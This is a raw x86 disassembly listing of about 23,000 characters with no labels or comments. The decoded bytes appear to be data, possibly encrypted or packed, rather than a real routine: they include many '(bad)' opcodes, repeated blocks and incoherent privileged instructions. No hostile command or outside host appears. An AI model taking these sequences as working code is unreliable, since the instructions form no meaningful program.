  425b1c:	add    BYTE PTR [eax],al
  425b1e:	add    BYTE PTR [eax-0x33],dh
  425b21:	jbe    0x425b20
  425b23:	int    0x8d
  425b25:	std    
  425b26:	sar    bh,0x63
  425b29:	cmp    edi,DWORD PTR [ecx+0x3b]
  425b2c:	or     al,0xd3
  425b2e:	mov    ebp,0x28f2d392
  425b33:	push   ebx
  425b34:	shl    DWORD PTR [eax-0x33],cl
  425b37:	jbe    0x425b65
  425b39:	iret   
  425b3a:	or     DWORD PTR [ecx-0x80],eax
  425b3d:	add    BYTE PTR [eax+0x3d01cd71],0x81
  425b44:	add    BYTE PTR [eax-0x69ffb000],0x24
  425b4b:	int    0x8d
  425b4d:	push   esp
  425b4e:	or     al,BYTE PTR [ecx-0x32528933]
  425b54:	lea    esi,[ebp-0x6d82bad1]
  425b5a:	shr    ebx,cl
  425b5c:	xchg   edx,eax
  425b5d:	int    0x8d
  425b5f:	lods   eax,DWORD PTR ds:[esi]
  425b60:	int    0x96
  425b62:	mov    ch,0x3b
  425b64:	leave  
  425b65:	cmp    ebx,edx
  425b67:	push   ebx
  425b68:	icebp  
  425b69:	bound  eax,QWORD PTR [eax]
  425b6b:	(bad)  
  425b6c:	xor    al,0xd3
  425b6e:	repnz sub BYTE PTR [eax],al
  425b71:	(bad)  
  425b72:	inc    esp
  425b73:	mov    ebp,0xfb94
  425b78:	int    0x76
  425b7a:	lods   eax,DWORD PTR ds:[esi]
  425b7b:	int    0x8d
  425b7d:	mov    ch,0x2f
  425b7f:	inc    ebp
  425b80:	jge    0x425b14
  425b82:	shr    ebx,cl
  425b84:	xchg   edx,eax
  425b85:	int    0x8d
  425b87:	lods   eax,DWORD PTR ds:[esi]
  425b88:	int    0x96
  425b8a:	mov    ch,0x3b
  425b8c:	leave  
  425b8d:	cmp    ebx,edx
  425b8f:	push   ebx
  425b90:	icebp  
  425b91:	bound  eax,QWORD PTR [eax]
  425b93:	(bad)  
  425b94:	push   esp
  425b95:	shl    edx,cl
  425b97:	sub    BYTE PTR [eax],al
  425b99:	(bad)  
  425b9a:	cmp    al,0xbd
  425b9c:	inc    esp
  425b9d:	sti    
  425b9e:	add    BYTE PTR [eax],al
  425ba0:	int    0x76
  425ba2:	std    
  425ba3:	int    0x8d
  425ba5:	std    
  425ba6:	cmp    ecx,DWORD PTR [ebx+edx*8]
  425ba9:	repnz sub BYTE PTR [ebx],bh
  425bac:	jns    0x425b81
  425bae:	mov    ebp,0xcdd35392
  425bb3:	(bad)  
  425bb4:	std    
  425bb5:	int    0x96
  425bb7:	std    
  425bb8:	cmp    ecx,DWORD PTR [edi]
  425bba:	shr    ebx,cl
  425bbc:	xchg   edx,eax
  425bbd:	cmp    edx,ebp
  425bbf:	shr    edx,cl
  425bc1:	sub    BYTE PTR [ebx+0x13],dl
  425bc4:	xchg   ebx,edx
  425bc6:	int    0x8d
  425bc8:	std    
  425bc9:	int    0x96
  425bcb:	std    
  425bcc:	cmp    ecx,DWORD PTR [edi]
  425bce:	shr    ebx,cl
  425bd0:	xchg   edx,eax
  425bd1:	cmp    edx,ebp
  425bd3:	shr    edx,cl
  425bd5:	sub    BYTE PTR [ebx+0x13],dl
  425bd8:	xchg   ebx,edx
  425bda:	int    0x8d
  425bdc:	std    
  425bdd:	int    0x96
  425bdf:	std    
  425be0:	cmp    ecx,DWORD PTR [edi]
  425be2:	shr    ebx,cl
  425be4:	xchg   edx,eax
  425be5:	cmp    edx,ebp
  425be7:	shr    edx,cl
  425be9:	sub    BYTE PTR [ebx+0x13],dl
  425bec:	xchg   ebx,edx
  425bee:	or     al,BYTE PTR [esi]
  425bf0:	nop
  425bf1:	add    BYTE PTR [eax],al
  425bf3:	add    ch,cl
  425bf5:	jbe    0x425c4b
  425bf7:	int    0x80
  425bf9:	int    0x8d
  425bfb:	mov    ebp,0x3bbd96cd
  425c00:	(bad)  
  425c02:	aad    0xd3
  425c04:	jmp    0x425b98
  425c06:	shr    edx,cl
  425c08:	sub    BYTE PTR [ebx+0x13],dl
  425c0b:	or     al,BYTE PTR ds:0xd4cf
  425c11:	add    ch,cl
  425c13:	jbe    0x425c61
  425c15:	int    0x80
  425c17:	int    0x8d
  425c19:	std    
  425c1a:	int    0x96
  425c1c:	std    
  425c1d:	cmp    ecx,DWORD PTR [edi]
  425c1f:	shr    ebx,cl
  425c21:	xchg   edx,eax
  425c22:	int    0x6c
  425c24:	jo     0x425c61
  425c26:	aad    0xd3
  425c28:	jmp    0xcf05:0xa135328
  425c2f:	aam    0x0
  425c31:	add    BYTE PTR [eax],al
  425c33:	int    0x76
  425c35:	sbb    al,0xcd
  425c37:	lea    ebx,[ebx+edi*1]
  425c3a:	or     al,0xd3
  425c3c:	repnz sub BYTE PTR [ebx],bh
  425c3f:	jns    0x425c14
  425c41:	mov    ebp,0xcdd35392
  425c46:	(bad)  
  425c47:	std    
  425c48:	int    0x96
  425c4a:	std    
  425c4b:	cmp    edx,ebp
  425c4d:	cmp    ecx,DWORD PTR [edi]
  425c4f:	shr    edx,cl
  425c51:	sub    bl,dl
  425c53:	jmp    0x425be7
  425c55:	push   ebx
  425c56:	adc    ecx,ebp
  425c58:	xchg   esi,eax
  425c59:	std    
  425c5a:	int    0xa6
  425c5c:	std    
  425c5d:	cmp    ebx,DWORD PTR [ecx+0x492f3d3]
  425c63:	hlt    
  425c64:	call   ebx
  425c66:	in     eax,0x28
  425c68:	push   ebx
  425c69:	aad    0x87
  425c6b:	adc    ecx,DWORD PTR [edx]
  425c6d:	add    eax,0xd4cf
  425c72:	add    ch,cl
  425c74:	jbe    0x425c73
  425c76:	int    0x8d
  425c78:	std    
  425c79:	add    al,0x2
  425c7b:	call   ebx
  425c7d:	repnz sub BYTE PTR [ebx],bh
  425c80:	jns    0x425c55
  425c82:	mov    ebp,0xcdd35392
  425c87:	(bad)  
  425c88:	std    
  425c89:	int    0x96
  425c8b:	std    
  425c8c:	add    al,0xfb
  425c8e:	(bad)  
  425c8f:	cmp    ecx,DWORD PTR [edi]
  425c91:	shr    edx,cl
  425c93:	sub    bl,dl
  425c95:	jmp    0x425c29
  425c97:	push   ebx
  425c98:	adc    eax,DWORD PTR [edi-0x272322d]
  425c9e:	int    0x96
  425ca0:	std    
  425ca1:	add    al,0xfb
  425ca3:	(bad)  
  425ca4:	cmp    ecx,DWORD PTR [edi]
  425ca6:	shr    edx,cl
  425ca8:	sub    bl,dl
  425caa:	jmp    0x425c3e
  425cac:	push   ebx
  425cad:	adc    ecx,edi
  425caf:	pop    ss
  425cb0:	nop
  425cb1:	add    BYTE PTR [eax],al
  425cb3:	add    BYTE PTR [edx-0x33],ah
  425cb6:	xchg   esi,eax
  425cb7:	std    
  425cb8:	int    0xa6
  425cba:	std    
  425cbb:	xchg   ebx,edx
  425cbd:	cmp    ebx,DWORD PTR [ecx+0xaa58dcf]
  425cc3:	int3   
  425cc4:	push   es
  425cc5:	aam    0x0
  425cc7:	add    BYTE PTR [eax],al
  425cc9:	int    0x76
  425ccb:	sub    al,0x4
  425ccd:	hlt    
  425cce:	call   ebx
  425cd0:	repz xchg edx,eax
  425cd2:	shl    ebp,cl
  425cd4:	sub    BYTE PTR [ebx-0x2b],dl
  425cd7:	iret   
  425cd8:	or     edi,ebp
  425cda:	add    BYTE PTR [eax+0x3d01cd80],0x81
  425ce1:	add    BYTE PTR [eax+0x50007162],0x0
  425ce8:	xchg   esi,eax
  425ce9:	and    al,0x6
  425ceb:	ins    DWORD PTR es:[edi],dx
  425cec:	aam    0xbc
  425cee:	int    0x76
  425cf0:	in     eax,dx
  425cf1:	int    0x8d
  425cf3:	adc    DWORD PTR [edi],ebp
  425cf5:	inc    ebp
  425cf6:	jge    0x425c8a
  425cf8:	shr    ebx,cl
  425cfa:	xchg   edx,eax
  425cfb:	int    0xe3
  425cfd:	int    0x7d
  425cff:	int    0x76
  425d01:	in     eax,dx
  425d02:	int    0x96
  425d04:	adc    DWORD PTR [ebx],edi
  425d06:	fidivr DWORD PTR [ebx]
  425d08:	lock shr DWORD PTR [ebp+0x4c76cd28],cl
  425d0f:	push   ebx
  425d10:	adc    ecx,ebp
  425d12:	xor    BYTE PTR [ebx-0x76],al
  425d15:	jo     0x425ce4
  425d17:	xchg   esi,eax
  425d18:	push   esp
  425d19:	in     al,dx
  425d1a:	push   esp
  425d1b:	int    0x92
  425d1d:	int    0xa6
  425d1f:	push   eax
  425d20:	retf   0x5324
  425d23:	or     DWORD PTR [eax+ecx*4],esp
  425d26:	int    0x76
  425d28:	cmc    
  425d29:	int    0x8d
  425d2b:	stc    
  425d2c:	das    
  425d2d:	inc    ebp
  425d2e:	jge    0x425cc2
  425d30:	shr    ebx,cl
  425d32:	xchg   edx,eax
  425d33:	int    0x8d
  425d35:	cmc    
  425d36:	int    0xa6
  425d38:	stc    
  425d39:	cmp    ecx,ecx
  425d3b:	cmp    ebx,ebp
  425d3d:	shl    edx,cl
  425d3f:	sub    ch,cl
  425d41:	lea    esi,[eax]
  425d43:	push   ebx
  425d44:	lds    eax,FWORD PTR [edi+0x4c76cd7d]
  425d4a:	int    0x1c
  425d4c:	inc    ebx
  425d4d:	(bad)  
  425d4e:	jo     0x425d5a
  425d50:	lea    esi,[eax]
  425d52:	or     cl,0xec
  425d55:	xchg   ch,cl
  425d57:	xchg   esi,eax
  425d58:	push   esp
  425d59:	int    0x76
  425d5b:	dec    esp
  425d5c:	int    0x4a
  425d5e:	int    0x20
  425d60:	xchg   DWORD PTR [esi-0x32e3f59c],ebx
  425d66:	sbb    al,0xcd
  425d68:	dec    edx
  425d69:	xchg   ebp,ecx
  425d6b:	sub    eax,0xa808080
  425d70:	lea    esi,[eax]
  425d72:	int    0x4a
  425d74:	int    0xa6
  425d76:	push   eax
  425d77:	xor    ecx,DWORD PTR [ecx*8+0x530a88a6]
  425d7e:	int    0x80
  425d80:	int    0x4a
  425d82:	xchg   DWORD PTR [esp+edi*1-0x33],edi
  425d86:	jbe    0x425d75
  425d88:	or     cl,BYTE PTR [ebp+0x118dcd0d]
  425d8e:	das    
  425d8f:	inc    ebp
  425d90:	jge    0x425d24
  425d92:	shr    ebx,cl
  425d94:	xchg   edx,eax
  425d95:	int    0x8d
  425d97:	in     eax,dx
  425d98:	int    0xa6
  425d9a:	adc    DWORD PTR [ebx],edi
  425d9c:	leave  
  425d9d:	cmp    ebx,ebp
  425d9f:	shl    edx,cl
  425da1:	sub    BYTE PTR [ebx-0x3b],dl
  425da4:	or     dh,BYTE PTR [esi+0x44]
  425da7:	int    0x76
  425da9:	xor    bl,ch
  425dab:	les    eax,FWORD PTR [ecx+0x76cd8080]
  425db1:	in     eax,dx
  425db2:	int    0x8d
  425db4:	adc    DWORD PTR [edi],ebp
  425db6:	inc    ebp
  425db7:	jge    0x425d4b
  425db9:	shr    ebx,cl
  425dbb:	xchg   edx,eax
  425dbc:	int    0x8d
  425dbe:	in     eax,dx
  425dbf:	int    0xa6
  425dc1:	adc    ebx,edx
  425dc3:	repnz sub ch,cl
  425dc6:	lea    edx,[ebx+edi*1]
  425dc9:	leave  
  425dca:	cmp    ebx,ebp
  425dcc:	add    al,0xd3
  425dce:	stc    
  425dcf:	push   ebx
  425dd0:	(bad)
  425dd3:	inc    ebx
  425dd4:	shr    DWORD PTR [edi],cl
  425dd6:	add    al,0xf7
  425dd8:	add    BYTE PTR [eax+0x30a6cd80],0xcf
  425ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425de0:	dec    ebx
  425de1:	mov    BYTE PTR [ebx],dh
  425de3:	jge    0x425def
  425de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425de6:	xor    al,0xa
  425de8:	lea    edi,[ecx*8+0x76cdf18d]
  425def:	xchg   ebp,eax
  425df0:	das    
  425df1:	inc    ebp
  425df2:	rcl    DWORD PTR [edx-0x326d422d],cl
  425df8:	jbe    0x425deb
  425dfa:	int    0xa6
  425dfc:	xchg   ebp,eax
  425dfd:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e03:	cmp    esi,eax
  425e05:	cmp    ebx,ebp
  425e07:	push   ebx
  425e08:	or     al,0xcd
  425e0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e0b:	stc    
  425e0c:	das    
  425e0d:	inc    ebp
  425e0e:	popf   
  425e0f:	xchg   edx,eax
  425e10:	or     dh,BYTE PTR [esi+0x54]
  425e13:	int    0x76
  425e15:	cmc    
  425e16:	push   ecx
  425e17:	out    0x54,al
  425e19:	add    al,0xd3
  425e1b:	dec    edx
  425e1c:	shr    esp,cl
  425e1e:	xchg   edx,eax
  425e1f:	int    0xa6
  425e21:	stc    
  425e22:	cmp    ebx,ebp
  425e24:	mov    DWORD PTR [esi+0x54b6d554],esp
  425e2a:	int    0xa6
  425e2c:	cmc    
  425e2d:	int    0x8d
  425e2f:	stc    
  425e30:	das    
  425e31:	inc    ebp
  425e32:	or     al,0x92
  425e34:	shr    DWORD PTR [ebp-0xa8932d8],cl
  425e3a:	shr    ebx,cl
  425e3c:	xchg   edx,eax
  425e3d:	int    0x8d
  425e3f:	stc    
  425e40:	cmp    ecx,ebx
  425e42:	shr    DWORD PTR [ebp+0x5476cd28],cl
  425e48:	cmp    esp,ecx
  425e4a:	push   ebx
  425e4b:	fcmovne st,st(5)
  425e4d:	lea    esi,[edi+ebp*1]
  425e50:	mov    ebx,0x2bc53389
  425e55:	ror    ebp,cl
  425e57:	(bad)  
  425e58:	icebp  
  425e59:	or     dh,BYTE PTR [esi+0x54]
  425e5c:	int    0x76
  425e5e:	xchg   ebp,eax
  425e5f:	das    
  425e60:	inc    ebp
  425e61:	rcl    DWORD PTR [edx-0x326d422d],cl
  425e67:	jbe    0x425e5a
  425e69:	int    0xa6
  425e6b:	xchg   ebp,eax
  425e6c:	shr    DWORD PTR [ebp+0x3476cd28],cl
  425e72:	das    
  425e73:	mov    ebx,0xa6020180
  425e78:	cmp    ebx,ebp
  425e7a:	dec    edx
  425e7b:	or     al,0x1
  425e7d:	ror    DWORD PTR [edx-0x2b],cl
  425e80:	mov    ebp,0xbdbfcb3b
  425e85:	or     ah,BYTE PTR [ebx]
  425e87:	and    eax,0x92d3352f
  425e8c:	shr    DWORD PTR [ebp+0x37d65692],cl
  425e92:	ficom  WORD PTR [ebx]
  425e94:	cmp    ecx,DWORD PTR [esi+eiz*2]
  425e97:	fidiv  WORD PTR [edi]
  425e99:	ficom  WORD PTR [ebx]
  425e9b:	(bad)  
  425e9c:	ss inc ebx
  425e9e:	or     al,0xd6
  425ea0:	cs int 0x92
  425ea3:	int    0x8d
  425ea5:	xor    BYTE PTR [edi+0x548dcd81],al
  425eab:	add    al,0x64
  425ead:	mov    BYTE PTR [eax-0x6d32ce2c],al
  425eb3:	int    0x8d
  425eb5:	xor    BYTE PTR [edi-0x7772327f],al
  425ebb:	xchg   DWORD PTR [esi+0x54],esi
  425ebe:	int    0x89
  425ec0:	or     DWORD PTR [eax-0x6dcb89fc],0x2f3c8d00
  425eca:	push   es
  425ecb:	and    eax,DWORD PTR [eax]
  425ecd:	add    BYTE PTR [eax],al
  425ecf:	in     al,dx
  425ed0:	test   DWORD PTR [edi+0x25230abd],edi
  425ed6:	int    0x76
  425ed8:	adc    al,0x81
  425eda:	jbe    0x425f20
  425edc:	leave  
  425edd:	jbe    0x425f4c
  425edf:	scas   al,BYTE PTR es:[edi]
  425ee0:	aaa    
  425ee1:	ficom  WORD PTR [ebx]
  425ee3:	or     ah,BYTE PTR [esi+0x6d76cd75]
  425ee9:	int    0x8d
  425eeb:	jne    0x425f1c
  425eed:	inc    ebp
  425eee:	jge    0x425e82
  425ef0:	shr    ebx,cl
  425ef2:	xchg   edx,eax
  425ef3:	int    0x8d
  425ef5:	ins    DWORD PTR es:[edi],dx
  425ef6:	int    0xa6
  425ef8:	jne    0x425ecd
  425efa:	repnz sub ch,cl
  425efd:	lea    ecx,[ebp+ecx*8-0x77]
  425f01:	cmp    ecx,ecx
  425f03:	cmp    ebx,ebp
  425f05:	push   ebx
  425f06:	(bad)
  425f09:	shl    esp,cl
  425f0b:	int    0x8d
  425f0d:	inc    esp
  425f0e:	inc    ebx
  425f0f:	mov    BYTE PTR [edi+0x54],dh
  425f12:	int    0x76
  425f14:	xor    BYTE PTR [edi+0x760a1476],al
  425f1a:	xor    ch,cl
  425f1c:	ins    BYTE PTR es:[edi],dx
  425f1d:	test   BYTE PTR [edx],cl
  425f1f:	jbe    0x425f35
  425f21:	int    0x76
  425f23:	in     eax,dx
  425f24:	int    0x8d
  425f26:	adc    DWORD PTR [edi],ebp
  425f28:	inc    ebp
  425f29:	jge    0x425ebd
  425f2b:	shr    ebx,cl
  425f2d:	xchg   edx,eax
  425f2e:	int    0x8d
  425f30:	in     eax,dx
  425f31:	int    0xa6
  425f33:	adc    DWORD PTR [ebx],edi
  425f35:	fnstsw WORD PTR [ebx]
  425f37:	leave  
  425f38:	push   ebx
  425f39:	(bad)
  425f3c:	sub    BYTE PTR [esi+0x76],bl
  425f3f:	adc    al,0x2f
  425f41:	push   es
  425f42:	mov    esi,0xcd0000ff
  425f47:	(bad)  
  425f48:	std    
  425f49:	int    0x96
  425f4b:	std    
  425f4c:	cmp    ecx,DWORD PTR [edi]
  425f4e:	shr    ebx,cl
  425f50:	xchg   edx,eax
  425f51:	sar    bh,0x9c
  425f54:	cmp    esi,ecx
  425f56:	shr    edx,cl
  425f58:	sub    BYTE PTR [ebx+0x13],dl
  425f5b:	int    0x96
  425f5d:	std    
  425f5e:	int    0xa6
  425f60:	std    
  425f61:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f67:	popf   
  425f68:	shl    ebp,cl
  425f6a:	sub    BYTE PTR [ebx-0x2b],dl
  425f6d:	xchg   DWORD PTR [ebx],edx
  425f6f:	int    0x96
  425f71:	std    
  425f72:	int    0xa6
  425f74:	std    
  425f75:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  425f7b:	popf   
  425f7c:	shl    ebp,cl
  425f7e:	sub    BYTE PTR [ebx-0x2b],dl
  425f81:	xchg   DWORD PTR [ebx],edx
  425f83:	int    0x96
  425f85:	std    
  425f86:	int    0xa6
  425f88:	std    
  425f89:	cmp    ebx,DWORD PTR [ecx-0xc2c62c5]
  425f8f:	xchg   edx,eax
  425f90:	shl    ebp,cl
  425f92:	sub    BYTE PTR [ebx-0x2b],dl
  425f95:	xchg   DWORD PTR [ebx],edx
  425f97:	or     cl,bh
  425f99:	nop
  425f9a:	add    BYTE PTR [eax],al
  425f9c:	add    ch,cl
  425f9e:	lea    edx,[eax-0x33]
  425fa1:	xchg   esi,eax
  425fa2:	mov    ebp,0x3bbda6cd
  425fa7:	cdq    
  425fa8:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fae:	in     eax,0x28
  425fb0:	push   ebx
  425fb1:	aad    0xa
  425fb3:	int3   
  425fb4:	pop    ss
  425fb5:	aam    0x0
  425fb7:	add    BYTE PTR [eax],al
  425fb9:	int    0x8d
  425fbb:	dec    esp
  425fbc:	int    0x89
  425fbe:	int    0x96
  425fc0:	std    
  425fc1:	int    0xa6
  425fc3:	std    
  425fc4:	int    0x7e
  425fc6:	jo     0x426003
  425fc8:	cdq    
  425fc9:	cmp    ebx,DWORD PTR [ebp-0x2c6d0c2d]
  425fcf:	in     eax,0x28
  425fd1:	push   ebx
  425fd2:	aad    0xa
  425fd4:	int3   
  425fd5:	pop    ss
  425fd6:	aam    0x0
  425fd8:	add    BYTE PTR [eax],al
  425fda:	int    0x8d
  425fdc:	sbb    al,0xcd
  425fde:	xchg   esi,eax
  425fdf:	sbb    al,0x3b
  425fe1:	icebp  
  425fe2:	shr    edx,cl
  425fe4:	sub    BYTE PTR [ebx],bh
  425fe6:	psrlq  mm5,mm3
  425fe9:	xchg   edx,eax
  425fea:	push   ebx
  425feb:	adc    ecx,ebp
  425fed:	xchg   esi,eax
  425fee:	std    
  425fef:	int    0xa6
  425ff1:	std    
  425ff2:	cmp    ebx,DWORD PTR [ebp+0x3bfd76cd]
  425ff8:	cdq    
  425ff9:	shl    ebp,cl
  425ffb:	sub    bl,dl
  425ffd:	repz xchg edx,eax
  425fff:	push   ebx
  426000:	aad    0xcd
  426002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426003:	std    
  426004:	cmp    edi,DWORD PTR [ecx+0x4]
  426007:	hlt    
  426008:	call   ebx
  42600a:	mov    ebp,0x28e5d392
  42600f:	push   ebx
  426010:	lds    eax,FWORD PTR [edi+0x17cc0af1]
  426016:	aam    0x0
  426018:	add    BYTE PTR [eax],al
  42601a:	int    0x8d
  42601c:	std    
  42601d:	int    0x96
  42601f:	std    
  426020:	cmp    ecx,DWORD PTR [edi]
  426022:	shr    ebx,cl
  426024:	xchg   edx,eax
  426025:	sar    bh,0x9c
  426028:	cmp    esi,ecx
  42602a:	shr    edx,cl
  42602c:	sub    BYTE PTR [ebx+0x13],dl
  42602f:	int    0x96
  426031:	std    
  426032:	int    0xa6
  426034:	std    
  426035:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42603b:	popf   
  42603c:	shl    ebp,cl
  42603e:	sub    BYTE PTR [ebx-0x2b],dl
  426041:	xchg   DWORD PTR [ebx],edx
  426043:	int    0x96
  426045:	std    
  426046:	int    0xa6
  426048:	std    
  426049:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42604f:	popf   
  426050:	shl    ebp,cl
  426052:	sub    BYTE PTR [ebx-0x2b],dl
  426055:	xchg   DWORD PTR [ebx],edx
  426057:	iret   
  426058:	xchg   esi,eax
  426059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42605a:	or     dl,BYTE PTR ds:0xd4cf
  426060:	add    bh,cl
  426062:	iret   
  426063:	nop
  426064:	add    BYTE PTR [eax],al
  426066:	add    BYTE PTR [ecx-0x33],dh
  426069:	(bad)  
  42606a:	std    
  42606b:	int    0x96
  42606d:	std    
  42606e:	cmp    ecx,DWORD PTR [edi]
  426070:	int    0xd6
  426072:	sub    al,0x3b
  426074:	icebp  
  426075:	shr    ebx,cl
  426077:	xchg   edx,eax
  426078:	shr    edx,cl
  42607a:	sub    BYTE PTR [ebx+0x13],dl
  42607d:	jno    0x42604e
  42607f:	pop    es
  426080:	out    dx,eax
  426081:	add    BYTE PTR [eax+0x7cd7080],0x3d
  426088:	add    DWORD PTR [eax+0x500080],0x7cd2496
  426092:	add    DWORD PTR [ecx+0x760a8080],eax
  426098:	dec    esp
  426099:	int    0x76
  42609b:	mov    ch,cl
  42609d:	mov    BYTE PTR [edi-0x72f5b373],al
  4260a3:	dec    esp
  4260a4:	int    0x8d
  4260a6:	cmc    
  4260a7:	int    0x96
  4260a9:	stc    
  4260aa:	das    
  4260ab:	inc    ebp
  4260ac:	jecxz  0x426040
  4260ae:	shl    ebx,cl
  4260b0:	xchg   edx,eax
  4260b1:	int    0x96
  4260b3:	cmc    
  4260b4:	int    0xd6
  4260b6:	stc    
  4260b7:	cmp    esi,edi
  4260b9:	shr    edx,cl
  4260bb:	sub    ch,cl
  4260bd:	xchg   esi,eax
  4260be:	cmc    
  4260bf:	cmp    esi,eax
  4260c1:	push   ebx
  4260c2:	bswap  ebp
  4260c4:	(bad)  
  4260c5:	stc    
  4260c6:	das    
  4260c7:	inc    ebp
  4260c8:	sti    
  4260c9:	xchg   edx,eax
  4260ca:	shr    edi,cl
  4260cc:	xchg   edx,eax
  4260cd:	int    0xd6
  4260cf:	cmc    
  4260d0:	int    0xa6
  4260d2:	stc    
  4260d3:	cmp    ebx,ecx
  4260d5:	cmp    ebx,ebp
  4260d7:	push   ebx
  4260d8:	aad    0x87
  4260da:	adc    ecx,ebp
  4260dc:	xchg   esi,eax
  4260dd:	cmc    
  4260de:	sar    DWORD PTR [ecx-0x62932d8],cl
  4260e4:	das    
  4260e5:	inc    ebp
  4260e6:	sti    
  4260e7:	xchg   edx,eax
  4260e8:	shr    edi,cl
  4260ea:	xchg   edx,eax
  4260eb:	int    0xd6
  4260ed:	cmc    
  4260ee:	int    0xa6
  4260f0:	stc    
  4260f1:	cmp    ebx,ecx
  4260f3:	cmp    ebx,ebp
  4260f5:	push   ebx
  4260f6:	aad    0x87
  4260f8:	adc    ecx,ebp
  4260fa:	xchg   esi,eax
  4260fb:	cmc    
  4260fc:	sar    DWORD PTR [ecx-0x62932d8],cl
  426102:	das    
  426103:	inc    ebp
  426104:	sti    
  426105:	xchg   edx,eax
  426106:	shr    edi,cl
  426108:	xchg   edx,eax
  426109:	int    0xd6
  42610b:	cmc    
  42610c:	cmp    ebx,ecx
  42610e:	int    0xe6
  426110:	stc    
  426111:	cmp    eax,DWORD PTR [eax]
  426113:	push   ebx
  426114:	fld    DWORD PTR [edi+0x707113]
  42611a:	(bad)  
  42611b:	dec    esp
  42611c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426122:	add    BYTE PTR [eax],al
  426124:	int    0x76
  426126:	or     eax,0xcb63a8aa
  42612b:	rcl    BYTE PTR [eax-0x80],cl
  42612e:	xchg   esi,eax
  42612f:	int    0xed
  426131:	add    al,0xed
  426133:	inc    esp
  426134:	pop    ebx
  426135:	cwde   
  426136:	call   0x76c9:0xcb3bdd3b
  42613d:	popf   
  42613e:	(bad)  
  42613f:	aaa    
  426140:	ficom  WORD PTR [ebx]
  426142:	pop    ebp
  426143:	mov    ebp,0xa25230a
  426148:	jbe    0x4260ef
  42614a:	leave  
  42614b:	jbe    0x42610a
  42614d:	xchg   ecx,eax
  42614e:	aaa    
  42614f:	ficom  WORD PTR [ebx]
  426151:	or     dh,BYTE PTR [esi-0x13]
  426154:	leave  
  426155:	jbe    0x426144
  426157:	dec    ecx
  426158:	mov    al,ds:0x76c93586
  42615d:	cmc    
  42615e:	dec    ecx
  42615f:	lahf   
  426160:	xchg   BYTE PTR ds:0x691176c9,dh
  426166:	and    DWORD PTR [esi+0x1176c935],eax
  42616c:	cmp    DWORD PTR [ecx],esp
  42616e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426174:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42617b:	jbe    0x426176
  42617d:	int    0x76
  42617f:	sbb    al,0xcd
  426181:	shl    BYTE PTR ds:0xcd808081,1
  426187:	jbe    0x4261a5
  426189:	int    0x8d
  42618b:	sbb    al,0xcd
  42618d:	add    DWORD PTR ds:0xcd808081,ebp
  426193:	xor    ch,cl
  426195:	pop    esp
  426196:	xchg   eax,esp
  426198:	fs int 0x96
  42619b:	popf   
  42619c:	int    0xa
  42619e:	and    eax,0xa808081
  4261a3:	out    0xb5,al
  4261a5:	int    0xe6
  4261a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a8:	das    
  4261a9:	inc    ebp
  4261aa:	add    edx,DWORD PTR [edx-0x326def2d]
  4261b0:	out    0x9d,al
  4261b2:	int    0xa6
  4261b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261b5:	adc    bh,bl
  4261b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261b8:	mov    esi,0xdd3b4229
  4261bd:	shr    ecx,cl
  4261bf:	sub    ch,cl
  4261c1:	pop    esi
  4261c2:	push   ebx
  4261c3:	aad    0x43
  4261c5:	(bad)  
  4261c7:	nop
  4261c8:	int    0x18
  4261ca:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261d0:	int    0x96
  4261d2:	xor    ch,cl
  4261d4:	xchg   esi,eax
  4261d5:	dec    esp
  4261d6:	iret   
  4261d7:	xchg   esi,eax
  4261d8:	lods   eax,DWORD PTR ds:[esi]
  4261d9:	bound  eax,QWORD PTR [eax]
  4261db:	(bad)  
  4261dc:	stc    
  4261dd:	jno    0x42624f
  4261df:	cwde   
  4261e0:	add    dh,dl
  4261e2:	sbb    al,0xcf
  4261e4:	jbe    0x42619b
  4261e6:	add    dh,dl
  4261e8:	mov    BYTE PTR [eax],al
  4261ea:	(bad)  
  4261eb:	cmc    
  4261ec:	add    dh,dl
  4261ee:	adc    DWORD PTR [eax],eax
  4261f0:	(bad)  
  4261f1:	in     eax,dx
  4261f2:	jo     0x4261c3
  4261f4:	jbe    0x4261f3
  4261f6:	jo     0x4261b5
  4261f8:	stos   BYTE PTR es:[edi],al
  4261f9:	clc    
  4261fa:	add    BYTE PTR [eax],al
  4261fc:	or     dh,BYTE PTR [esi+0x1c]
  4261ff:	int    0x76
  426201:	sbb    al,0xcd
  426203:	lea    esp,[edx+ecx*1]
  426206:	outs   dx,BYTE PTR ds:[esi]
  426207:	adc    al,0xcd
  426209:	jbe    0x42622f
  42620b:	leave  
  42620c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426213:	lods   eax,DWORD PTR ds:[esi]
  426214:	int    0x8d
  426216:	and    al,0xa
  426218:	outs   dx,BYTE PTR ds:[esi]
  426219:	test   ch,cl
  42621b:	jbe    0x42624d
  42621d:	int    0x8d
  42621f:	and    al,0xa
  426221:	outs   dx,BYTE PTR ds:[esi]
  426222:	mov    ch,cl
  426224:	jbe    0x42623a
  426226:	int    0x8d
  426228:	and    al,0xa
  42622a:	outs   dx,BYTE PTR ds:[esi]
  42622b:	dec    esp
  42622c:	int    0x76
  42622e:	and    al,0xc9
  426230:	ins    BYTE PTR es:[edi],dx
  426231:	and    al,0x81
  426233:	add    BYTE PTR [eax-0x32e11380],0x76
  42623a:	sbb    al,0xcd
  42623c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426243:	or     ch,0xa
  426246:	and    eax,0xcd808081
  42624b:	xor    BYTE PTR [ebx],0x81
  42624e:	or     dh,BYTE PTR [esi-0x3]
  426251:	int    0x76
  426253:	std    
  426254:	stos   BYTE PTR es:[edi],al
